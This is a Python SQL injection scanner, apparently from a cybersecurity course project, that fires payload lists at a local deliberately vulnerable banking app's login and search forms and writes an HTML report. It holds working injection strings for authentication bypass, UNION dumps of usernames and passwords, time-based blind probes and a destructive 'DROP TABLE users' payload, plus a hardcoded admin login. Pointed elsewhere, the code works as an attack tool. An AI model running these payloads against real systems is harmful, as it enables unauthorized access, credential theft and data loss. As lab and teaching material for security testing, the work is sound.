import requests
import time
import os
from colorama import init, Fore, Style

# Initialize colorama so colors work correctly on Windows terminals
init(autoreset=True)

# ─── Target configuration ────────────────────────────────────────────────────

BASE_URL    = "http://127.0.0.1:5000"
LOGIN_URL   = f"{BASE_URL}/login"
SEARCH_URL  = f"{BASE_URL}/search"

# ─── Payload definitions ─────────────────────────────────────────────────────
# Each entry is: (payload string, description, technique category)

LOGIN_PAYLOADS = [
    ("' OR 1=1 --",           "Classic OR bypass",             "Authentication Bypass"),
    ("' OR '1'='1' --",      "Quoted OR bypass",              "Authentication Bypass"),
    ("' OR 'x'='x' --",      "String equality bypass",        "Authentication Bypass"),
    ("admin' --",            "Admin comment injection",       "Authentication Bypass"),
    ("' OR 1=1#",            "Hash comment bypass",           "Authentication Bypass"),
    ("') OR ('1'='1",        "Parenthesis bypass",            "Authentication Bypass"),
    ("' AND 1=1 --",         "Blind Boolean TRUE",            "Blind Injection"),
    ("' AND 1=2 --",         "Blind Boolean FALSE",           "Blind Injection"),
    ("' AND randomblob(200000000) --", "Time-based delay",    "Blind Injection"),
    ("' UNION SELECT 1,2,3,4 --",     "UNION column probe",   "Data Extraction"),
    ("' UNION SELECT id,username,password,role FROM users --", "Dump all users", "Data Extraction"),
    ("'; DROP TABLE users; --",       "Destructive drop",     "Destructive"),
]

SEARCH_PAYLOADS = [
    ("' OR '1'='1",          "Dump all users via OR",         "Data Extraction"),
    ("' OR 1=1 --",          "Comment bypass on search",      "Data Extraction"),
    ("admin' --",            "Target admin account",          "Data Extraction"),
    ("' UNION SELECT id,username,password,role FROM users --", "UNION full dump", "Data Extraction"),
    ("' AND 1=2 UNION SELECT 1,'hacked',3,4 --", "Injected row in results", "Data Extraction"),
]

# Keywords in the response body that suggest the injection worked
# Note: "welcome" is intentionally excluded — the login page says "Welcome Back"
# which would cause false positives on every failed attempt
SUCCESS_INDICATORS = [
    "account dashboard",
    "db error", "database error", "sqlite",
    "syntax error", "no such column",
    "administrator", "manager", "customer",
    "hacked",
]

# ─── Helpers ─────────────────────────────────────────────────────────────────

def risk_color(level):
    """Return the colorama color for a given risk level string."""
    return {
        "CRITICAL": Fore.RED + Style.BRIGHT,
        "HIGH":     Fore.YELLOW + Style.BRIGHT,
        "MEDIUM":   Fore.CYAN,
        "LOW":      Fore.WHITE,
    }.get(level, Fore.WHITE)

def classify_risk(category):
    """Map a technique category to a risk level."""
    if category == "Destructive":
        return "CRITICAL"
    if category == "Authentication Bypass":
        return "HIGH"
    if category == "Data Extraction":
        return "HIGH"
    if category == "Blind Injection":
        return "MEDIUM"
    return "LOW"

def explain_payload(payload, category):
    """Return a plain-English explanation of what the payload does."""
    explanations = {
        "Authentication Bypass":
            "This payload manipulates the SQL WHERE clause so the condition is always true,\n"
            "  allowing login without knowing the real password.",
        "Blind Injection":
            "This payload does not return visible data. Instead it checks whether the\n"
            "  database responds differently to true vs. false conditions (or introduces a delay),\n"
            "  confirming a vulnerability even when no error is shown.",
        "Data Extraction":
            "This payload attempts to read data from the database — such as all usernames and\n"
            "  passwords — by appending a second SELECT statement using UNION.",
        "Destructive":
            "This payload attempts to delete the entire users table from the database.\n"
            "  In a real attack this would erase all account data permanently.",
    }
    return explanations.get(category, "No explanation available.")

def print_section(title):
    print(Style.BRIGHT + Fore.WHITE + f"\n{'─'*60}")
    print(Style.BRIGHT + Fore.WHITE + f"  {title}")
    print(Style.BRIGHT + Fore.WHITE + f"{'─'*60}")

def login_as_admin(session):
    """Log into the app as admin so we can access the /search endpoint."""
    session.post(LOGIN_URL, data={"username": "admin", "password": "admin123"})

# ─── Core scan logic ─────────────────────────────────────────────────────────

def scan_endpoint(s, url, payloads, field_name, endpoint_label):
    """
    Send each payload to a form field on the target URL.
    Returns a list of result dictionaries for the HTML report.
    """
    results = []
    vulnerable_count = 0

    print_section(f"Scanning: {endpoint_label}  ({url})")
    print(f"  Sending {len(payloads)} payloads into the '{field_name}' field...\n")

    for payload, description, category in payloads:
        data = {field_name: payload, "password": "irrelevant"}

        # ── What we are about to do ──────────────────────────────────────────
        print(Fore.WHITE + f"  [→] Testing  : {description}")
        print(Fore.WHITE + f"      Payload  : {payload}")
        print(Fore.WHITE + f"      Category : {category}")

        start = time.time()
        timeout_hit = False

        try:
            response = s.post(url, data=data, timeout=8, allow_redirects=True)
            elapsed = round(time.time() - start, 2)
            body = response.text.lower()

            triggered = any(indicator in body for indicator in SUCCESS_INDICATORS)
            risk      = classify_risk(category)
            color     = risk_color(risk)

            if triggered:
                vulnerable_count += 1
                status = "VULNERABLE"
                print(color + f"      Result   : VULNERABLE  |  Risk: {risk}  |  Response time: {elapsed}s")
                print(color + f"      What happened: {explain_payload(payload, category)}")
            else:
                status = "SAFE"
                print(Fore.GREEN + f"      Result   : SAFE  |  Response time: {elapsed}s")

        except requests.exceptions.Timeout:
            # A timeout on a time-based payload strongly suggests vulnerability
            elapsed = 8.0
            triggered = True
            timeout_hit = True
            risk = "MEDIUM"
            status = "TIMEOUT (possible blind injection)"
            vulnerable_count += 1
            print(Fore.YELLOW + f"      Result   : TIMEOUT — the server took too long to respond.")
            print(Fore.YELLOW + f"      What happened: {explain_payload(payload, category)}")

        except requests.exceptions.ConnectionError:
            print(Fore.RED + "      [ERROR] Cannot reach the server. Is vulnerable_app.py running?")
            break

        results.append({
            "payload":     payload,
            "description": description,
            "category":    category,
            "status":      status,
            "risk":        classify_risk(category),
            "time":        elapsed,
        })

        print()  # blank line between payloads for readability

    print(Fore.WHITE + f"  Payloads tested  : {len(payloads)}")
    if vulnerable_count:
        print(Fore.RED + Style.BRIGHT + f"  Vulnerabilities  : {vulnerable_count}")
    else:
        print(Fore.GREEN + f"  Vulnerabilities  : {vulnerable_count}")

    return results, vulnerable_count

# ─── HTML report generator ───────────────────────────────────────────────────

def generate_html_report(login_results, search_results):
    """Build an HTML file showing all scan results in a styled table."""

    def row_color(status):
        if "VULNERABLE" in status:  return "#fff5f5"
        if "TIMEOUT"    in status:  return "#fffbeb"
        return "#f0fff4"

    def badge(status, risk):
        if "VULNERABLE" in status:
            colors = {"CRITICAL": "#c53030", "HIGH": "#c05621", "MEDIUM": "#2b6cb0"}
            bg = colors.get(risk, "#555")
            return f'<span style="background:{bg};color:#fff;padding:3px 10px;border-radius:12px;font-size:12px;">{risk}</span>'
        if "TIMEOUT" in status:
            return '<span style="background:#b7791f;color:#fff;padding:3px 10px;border-radius:12px;font-size:12px;">TIMEOUT</span>'
        return '<span style="background:#276749;color:#fff;padding:3px 10px;border-radius:12px;font-size:12px;">SAFE</span>'

    def build_table(results, label):
        rows = ""
        for r in results:
            bg = row_color(r["status"])
            b  = badge(r["status"], r["risk"])
            rows += f"""
            <tr style="background:{bg}">
              <td>{r['description']}</td>
              <td><code style="font-size:12px">{r['payload']}</code></td>
              <td>{r['category']}</td>
              <td>{b}</td>
              <td>{r['time']}s</td>
            </tr>"""
        return f"""
        <h3 style="color:#1a3c6e;margin:32px 0 12px">{label}</h3>
        <table>
          <thead>
            <tr>
              <th>Description</th><th>Payload</th><th>Category</th>
              <th>Result / Risk</th><th>Response Time</th>
            </tr>
          </thead>
          <tbody>{rows}</tbody>
        </table>"""

    total = len(login_results) + len(search_results)
    vulns = sum(1 for r in login_results + search_results if "SAFE" not in r["status"])

    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>SQL Injection Scan Report — SecureBank</title>
<style>
  body {{ font-family: 'Segoe UI', Arial, sans-serif; background:#f0f4f8; margin:0; padding:0; }}
  header {{ background:#1a3c6e; color:#fff; padding:28px 48px; }}
  header h1 {{ margin:0; font-size:24px; }}
  header p  {{ margin:6px 0 0; color:#a0b8d8; font-size:14px; }}
  .report-body {{ max-width:1000px; margin:40px auto; background:#fff;
                  border-radius:10px; box-shadow:0 4px 24px rgba(0,0,0,.10);
                  padding:40px 48px; }}
  .summary {{ display:flex; gap:20px; margin-bottom:8px; }}
  .stat {{ flex:1; background:#f7fafc; border-radius:8px; padding:18px 22px;
           border:1px solid #e2e8f0; }}
  .stat h4 {{ color:#718096; font-size:12px; text-transform:uppercase; margin-bottom:6px; }}
  .stat .val {{ font-size:28px; font-weight:700; color:#1a3c6e; }}
  .stat .val.red {{ color:#c53030; }}
  table {{ width:100%; border-collapse:collapse; font-size:13px; }}
  th {{ background:#1a3c6e; color:#fff; padding:10px 14px; text-align:left; }}
  td {{ padding:10px 14px; border-bottom:1px solid #e2e8f0; vertical-align:top; }}
  footer {{ text-align:center; padding:24px; color:#a0aec0; font-size:12px; }}
</style>
</head>
<body>
<header>
  <h1>SQL Injection Scan Report</h1>
  <p>Target: {BASE_URL} &nbsp;|&nbsp; Scanned: Login &amp; User Search endpoints</p>
</header>
<div class="report-body">
  <div class="summary">
    <div class="stat"><h4>Total Payloads</h4><div class="val">{total}</div></div>
    <div class="stat"><h4>Vulnerabilities</h4><div class="val red">{vulns}</div></div>
    <div class="stat"><h4>Endpoints Tested</h4><div class="val">2</div></div>
    <div class="stat"><h4>Verdict</h4>
      <div class="val red" style="font-size:16px;margin-top:4px;">{"VULNERABLE" if vulns else "SECURE"}</div>
    </div>
  </div>
  {build_table(login_results, "Endpoint 1 — Login Form (/login)")}
  {build_table(search_results, "Endpoint 2 — User Search (/search)")}
</div>
<footer>Generated by SQL Injection Scanner &mdash; Foundations of Cybersecurity Project</footer>
</body>
</html>"""

    report_path = os.path.join(os.path.dirname(__file__), "scan_report.html")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    return report_path

# ─── Entry point ─────────────────────────────────────────────────────────────

def main():
    print(Style.BRIGHT + Fore.WHITE + "\n" + "="*60)
    print(Style.BRIGHT + Fore.WHITE +   "   SQL INJECTION SCANNER")
    print(Style.BRIGHT + Fore.WHITE +   "   Target: SecureBank  |  http://127.0.0.1:5000")
    print(Style.BRIGHT + Fore.WHITE + "="*60)

    print(f"""
  HOW THIS SCANNER WORKS
  ──────────────────────
  SQL injection is an attack where malicious text is typed into
  a form field. If the server builds its database query using
  raw user input, the attacker's text becomes part of the SQL
  command and can bypass authentication, dump data, or delete
  records.

  This scanner automates that process:
    1. It sends {len(LOGIN_PAYLOADS)} attack strings to the Login form.
    2. It logs in as admin and sends {len(SEARCH_PAYLOADS)} more to the Search page.
    3. It reads each response and looks for signs that the
       injection succeeded (e.g. "Welcome", database errors,
       unexpected data rows appearing).
    4. It assigns a risk rating and prints the result.
    5. At the end it saves a full HTML report you can open
       in a browser.
""")

    s = requests.Session()

    # ── Scan the login form ──────────────────────────────────────────────────
    login_results, login_vulns = scan_endpoint(
        s, LOGIN_URL, LOGIN_PAYLOADS, "username", "Login Form"
    )

    # ── Log in as admin then scan the search page ────────────────────────────
    print_section("Logging in as admin to access /search ...")
    login_as_admin(s)
    print(Fore.GREEN + "  Admin session established.\n")

    search_results, search_vulns = scan_endpoint(
        s, SEARCH_URL, SEARCH_PAYLOADS, "query", "User Search Page"
    )

    # ── Final summary ────────────────────────────────────────────────────────
    total_vulns = login_vulns + search_vulns
    total_tests = len(LOGIN_PAYLOADS) + len(SEARCH_PAYLOADS)

    print_section("FINAL SUMMARY")
    print(f"  Endpoints scanned    : 2  (Login, User Search)")
    print(f"  Total payloads sent  : {total_tests}")
    if total_vulns:
        print(Fore.RED + Style.BRIGHT + f"  Vulnerabilities found: {total_vulns}")
        print(Fore.RED + Style.BRIGHT +  "  VERDICT: TARGET IS VULNERABLE TO SQL INJECTION")
    else:
        print(Fore.GREEN + f"  Vulnerabilities found: 0")
        print(Fore.GREEN +  "  VERDICT: No vulnerabilities detected.")

    print(f"\n  Generating HTML report ...")
    path = generate_html_report(login_results, search_results)
    print(Fore.CYAN + f"  Report saved to: {path}")
    print(Fore.CYAN +  "  Open scan_report.html in your browser to view full results.\n")

if __name__ == "__main__":
    main()
